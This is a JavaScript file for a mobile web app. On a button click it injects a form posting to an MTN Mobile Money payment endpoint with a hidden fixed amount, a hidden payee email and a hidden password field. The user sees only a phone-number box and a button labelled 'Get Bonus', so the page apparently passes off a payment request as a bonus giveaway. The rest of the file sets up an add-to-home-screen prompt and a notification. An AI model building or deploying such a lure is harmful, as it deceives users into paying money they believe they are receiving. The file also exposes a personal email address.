var content = document.getElementById("content");
var button = document.getElementById("continue-button");
var subButton = document.getElementById("Button_Image");
var addToHome = document.getElementById("addToHome");

button.addEventListener("click", () => {
  content.innerHTML = `

      <div class=" col-sm-12 col-md-12 my-5">

        <form id="formmomo"
          method="GET"
          action="https://developer.mtn.cm/OnlineMomoWeb/faces/transaction/transactionRequest.xhtml">
          <input type="hidden" name="idbouton" value="2" autocomplete="off">
          <input type="hidden" name="typebouton" value="PAIE" autocomplete="off">
          <input class="momo mount form-control form-control-lg" type="hidden" placeholder="amount" name="_amount" value="100" id="montant" autocomplete="off">
          <div class="form-group">
            <label for="phone-number" class="h5 lobster-lg ">Phone Number</label>
            <input class="momo host form-control form-control-lg rounded mt-3 border-warning " type="number" placeholder="phone number" name="_tel" value="" autocomplete="off" id="phone-number">
          </div>
          <input class="momo pwd" placeholder="Please enter your password" name="_clP" value="" autocomplete="off" type="hidden">
          <input type="hidden" name="_email" value="nsedrick101@gmail.com" autocomplete="off">
          <button type="image" id="Button_Image" name="submit" alt="OnloneMomo, le réflexe sécurité pour payer en ligne" autocomplete="off" class="btn btn-lg btn-warning btn-default rounded-pill text-white px-5 py-3 m-5 font-weight-bold">
            Get Bonus
          </button>
           <button
      id="addToHome"
      class="btn btn-outline-warning rounded-pill text-white px-5 py-3 font-weight-bold lato"
    >
      add to home screen
    </button>
        </form>
        </div>

`;
});

/* prompt user to  add to their home screen */
let promptEvt;

window.addEventListener("beforeinstallprompt", evt => {
  evt.preventDefault();
  console.log(evt);

  //save event for future use
  promptEvt = evt;

  // Update UI notify the user they can add to home screen
  addToHome.style.display = "block";

  return false;
});

function checkInstalledState() {
  console.log("subButton clicked ");
  //show install banner now
  if (promptEvt !== undefined) {
    // hide our user interface that shows our A2HS button
    addToHome.style.display = "none";

    promptEvt.prompt();

    promptEvt.userChoice.then(choiceResult => {
      if (choiceResult.outcome === "accepted") {
        console.log("User accepted the A2HS prompt");
      } else {
        console.log("User dismissed the A2HS prompt");
      }
      promptEvt = null;
    });
  }
}
addToHome.addEventListener("click", checkInstalledState);

//notifications

var n = new Notification("Title", {});
